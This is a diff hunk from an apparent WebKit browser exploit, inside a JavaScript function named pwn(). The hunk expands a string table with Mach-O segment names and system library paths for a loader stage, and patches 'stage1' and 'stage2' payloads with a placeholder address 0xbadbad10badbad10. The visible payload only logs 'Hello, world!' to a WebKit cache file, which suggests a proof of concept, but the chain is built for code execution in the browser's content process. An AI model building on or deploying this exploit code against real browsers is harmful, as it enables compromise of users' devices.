@@ -407,10 +407,19 @@ function pwn() {
     writeStringToUint8Array("_dlopen", ourArray, stringsOff + 92);
     writeStringToUint8Array("__TEXT", ourArray, stringsOff + 100);
     writeStringToUint8Array("__LINKEDIT", ourArray, stringsOff + 107);
-    writeStringToUint8Array("HOME", ourArray, stringsOff + 118);
-    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 123);
-    writeStringToUint8Array("\n", ourArray, stringsOff + 175);
-    writeStringToUint8Array("Hello, world!\n", ourArray, stringsOff + 177);
+    writeStringToUint8Array("__DATA", ourArray, stringsOff + 118);
+    writeStringToUint8Array("__all_image_info__DATA", ourArray, stringsOff + 125);
+    writeStringToUint8Array("__all_image_info__DATA_DIRTY", ourArray, stringsOff + 148);
+    writeStringToUint8Array("/usr/lib/system/libsystem_platform.dylib", ourArray, stringsOff + 177);
+    writeStringToUint8Array("/usr/lib/system/libsystem_kernel.dylib", ourArray, stringsOff + 218);
+    writeStringToUint8Array("/usr/lib/system/libsystem_malloc.dylib", ourArray, stringsOff + 257);
+    writeStringToUint8Array("/usr/lib/system/libsystem_asl.dylib", ourArray, stringsOff + 296);
+    writeStringToUint8Array("/usr/lib/system/libsystem_c.dylib", ourArray, stringsOff + 332);
+    writeStringToUint8Array("/usr/lib/system/libdyld.dylib", ourArray, stringsOff + 366);
+    writeStringToUint8Array("HOME", ourArray, stringsOff + 396);
+    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 401);
+    writeStringToUint8Array("\n", ourArray, stringsOff + 453);
+    writeStringToUint8Array("Hello, world!", ourArray, stringsOff + 455);
     
     stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
     stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
